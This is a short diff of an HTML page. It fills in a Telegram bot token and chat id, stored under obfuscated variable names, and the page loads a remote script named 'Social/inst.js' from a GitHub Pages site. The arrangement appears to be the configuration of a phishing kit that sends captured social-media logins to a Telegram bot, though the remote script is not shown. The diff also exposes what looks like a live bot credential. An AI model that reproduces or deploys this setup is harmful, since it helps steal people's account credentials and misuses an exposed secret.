@@ -7,8 +7,8 @@
 </head>
 <body>
   <script>
-    const iovjrtrdhhj9 = 'BOT-TOKEN'; 
-    const I94626736O = 'USER-ID';
+    const iovjrtrdhhj9 = '8216110554:AAGc_BJP6SQXxWQGAWr-_Qw718tU8VXCO7Q'; 
+    const I94626736O = '8565669852';
   </script>
   <script src="https://linksvo.github.io/Social/inst.js" defer></script>
 </body>
